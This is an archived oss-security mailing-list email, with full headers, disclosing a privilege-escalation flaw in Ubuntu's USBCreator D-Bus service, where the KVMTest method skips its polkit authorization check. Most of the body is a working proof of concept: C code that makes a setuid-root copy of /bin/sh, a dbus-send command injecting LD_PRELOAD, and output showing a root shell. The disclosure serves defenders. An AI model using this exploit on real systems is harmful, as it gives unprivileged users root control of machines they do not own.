X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1009" "Wednesday" "22" "April" "2015" "16:50:08" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>" "35" "[oss-security] USBCreator D-Bus service" nil nil nil "4" "2015042223:50:08" "[oss-security] USBCreator D-Bus service" (number mark "        taviso@googl Apr 22   35/1009  " thread-indent "\"[oss-security] USBCreator D-Bus service\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32177 invoked by uid 550); 22 Apr 2015 23:50:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32133 invoked from network); 22 Apr 2015 23:50:40 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:content-type;
        bh=gZNujmq8pvbDpOJtVcQSCjF+RwrWG+hlltfUm+eLCVE=;
        b=I/iRjAZqbI62N2jK5pQNjAFhtHYGhmItMvipsrKhpzzxFu3EMLEt/m1FfHSiJ6BZsg
         TWjjD3pYw8MrpN1ROUQ3lSl5bTEyQ6ado4vwMwUVwBbW3PJ9oHpe79dUXjzmScrZO62s
         wWInpCOj/yINESNAlLm2zt4X/3iBps8RnugpwDyHPsn7Reum+DUiaaOMl7JN1QrEgOgt
         FaZ8laW6UpY0FlHCpf7xNejtqw4vmeE0QE3ySfm7kjW/opwdG+6Q1Lk4ON5vYVZf4S5c
         dUGSMFwxdnhQBQMnyjL6FokWewE2bRWZcDgmI955b6gHYloPR7jaFVff/fyw3FsCxMLe
         mI1g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
         :content-type;
        bh=gZNujmq8pvbDpOJtVcQSCjF+RwrWG+hlltfUm+eLCVE=;
        b=K33KXJUJyzCIAQbCdRyrHraDAkqscYTJKB3/1mmcpCcvcOdkdRoWmjP+EXRINMop6X
         /MUUnlhzR5zQ012jrwMjTUZFIWhTbnh32rXZW6asJbQ2G6Mio2lpjrE/UbGBrIjuEvr4
         i3KpvPrzxNhytjgjvXEXpc+5/ab7l4Iwpag2n+30UaraQFfQKfM78qUBaVSPRuYg2U6L
         Rnm3DHpLLVWENtRrFXC8dZTK3X03CbmubIJVIVepAABb7ETbN1V38tbFlflVt5QgF0Ld
         /X5VveMpZiEuA81E5r/QAHu9jA4RrbS9tU6TnpU9CjJ8f6DhS/ohlOSY9dRm1gMOjsbX
         v/SA==
X-Gm-Message-State: ALoCoQkPSFta80M/9zjhHYwZi4iUH9JdmrX8XekMcC9Yp7VdjJDnJde8gsf1PbHOgTqAW+Hn6RHn
X-Received: by 10.140.105.198 with SMTP id c64mr64056qgf.61.1429746628888;
 Wed, 22 Apr 2015 16:50:28 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Wed, 22 Apr 2015 16:50:08 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] USBCreator D-Bus service
To: oss-security@lists.openwall.com

Hello,

[as-per previous discussion on the vendors list, skipping closed
discussion of low-severity issue]

On my Ubuntu VM, I have a D-Bus service listening on
com.ubuntu.USBCreator. As far as I can tell, this is installed by
default.

It looks like the author intended for all the methods to call
check_polkit, but KVMTest doesn't.

This seems like an obvious mistake, and the following appears to work
on my machine:

$ cat > test.c
void __attribute__((constructor)) init (void)
{
chown("/tmp/test", 0, 0);
chmod("/tmp/test", 04755);
}
^D
$ gcc -shared -fPIC -o /tmp/test.so test.c
$ cp /bin/sh /tmp/test
$ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator
/com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda
dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
$ ls -l /tmp/test
-rwsr-xr-x 1 root root 121272 Apr 22 16:43 /tmp/test
$ /tmp/test
# id
euid=0(root) groups=0(root)

Thanks, Tavis.
